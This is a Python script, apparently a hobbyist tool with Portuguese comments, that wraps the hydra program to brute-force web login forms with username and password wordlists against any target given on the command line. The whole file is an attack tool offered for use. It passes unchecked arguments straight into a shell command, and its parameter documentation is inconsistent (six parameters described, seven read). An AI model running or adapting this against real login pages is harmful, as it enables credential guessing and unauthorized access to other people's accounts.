#!/usr/bin/env python3
# nome: formbrute
# Autor: olive

# ==============================================]
# Descrição: programa desenvolvido para quebrar ]
# formilários de login usando simples comandos  ]
# usando 6 parametros                           ]
# ==============================================]

# ===================]
# Versão: v1.0 Beta  ]
#                    ]
# ===================]

# ============================
# uso do programa:
# 
# Você precisará sitar 6 parâmetros para o programa
# funciona correramente, caso contrário nunca
# Nunca quebrará, seguir exatamente como no uso
# que executar o bruteforce, nesse caso você precisa
# ter duas wordlists uma  para quebra o usuário e 
# outra para quebrar a senha e assim finalizamos o
# ataque completo...

# uso do programa e parametros
#  
# 1° <alvo>
#
# o primeiro parãmetro a ser sitado é o alvo, este
# alvo é um hostname ou site ou IP do site,
#
# 2° <POST ou GET>
# 
# o segundo parâmetro a ser sitado é 
# Saber se o parâmetro a ser atacado passa
# por POST ou GET e qual arquivo PHP recebe 
# esses parâmetros. ou seja, pode ser http-form-post
# se passar por post
# 
#
# 3° <arquivo PHP>
# o terceiro para parametro ser sitado é
# e o arquivo PHP que recebe as informações.
#
#
# 4 ° <nome do input de login>
# 
# o quarto parâmetro a ser sitado é
# o nome do input de login, que vão ser enviados
# via POST para o site. ou seja pode ser uname e
# a senha pode ser password
#
# 5 ° <mensagem de erro>
# 
# o quinto parâmetro a ser sitado é
# a mensagem de erro apôs ter várias tentativas de
# login incorretas, apôs estas tentativas de acesso, 
# ou seja, de tanto requisiçôes ser feitas no
# servidor, ele acaba retornando uma mensagem de erro# e esta mensagem na marioria das vezes retorna. esta
# 
# "login ou senha incorretos"  etc
#
# 6° <arquivo de palavras para usuários>
# 
# o sexto parâmetro a ser sitado é
# um dicionário/wordlist para quebra de usuários,
# neste caso terá que ter uma wordlist separada pra
# apenas usuários
#
# 7° <arquivo de palavras para senhas>
# 
# o sétimo parâmetro a ser sitado é
# um dicionário/wordlist para quebra de senhas,
# neste caap terá que ter uma wordlist sepadara pra
# apenas senhas
# ===========================

import sys, subprocess, time, os

try:
    def main():

        if os.path.exists('/usr/bin/hydra') == True:
        
            subprocess.run('clear')

            # banner
            os.system('bash .banner.sh')

            # variaveis
            # argumentos
            argumento_1 = sys.argv[1]
            argumento_2 = sys.argv[2]
            argumento_3 = sys.argv[3]
            argumento_4 = sys.argv[4]
            argumento_5 = sys.argv[5]
            argumento_6 = sys.argv[6]
            argumento_7 = sys.argv[7]

        
            # comando de processamento
            comando = 'hydra {} {} "/{}:{}=^USER^&pass=^PASS^:{}" -L {} -P {} -t 10'.format(str(argumento_1),str(argumento_2), argumento_3,str(argumento_4), str(argumento_5),str(argumento_6),str(argumento_7))
            """
            target, type form, name_input, msg_erro, userlist, passlist
            """

            # processamento & saida
            os.system('{}'.format(comando))



    if __name__ == '__main__':
        main()

# tratamento de erro
except IndexError:
    print("Erro ! ")
    print ("""
    
Usage: ./formbrute.py [args]



./formbrute.py [arg1 <target>] [arg2 <type form>] [arg3 <name_file_php>] [argv4 <name_input>] [arg4 <msg error>] [arg5 <userlist>] [arg6 <passlist>]




exemple:
        


./formbrute.py testphp.vulnweb.com http-form-post "userinfo.php" "uname" "login page" userlist.txt passlist.txt


""")
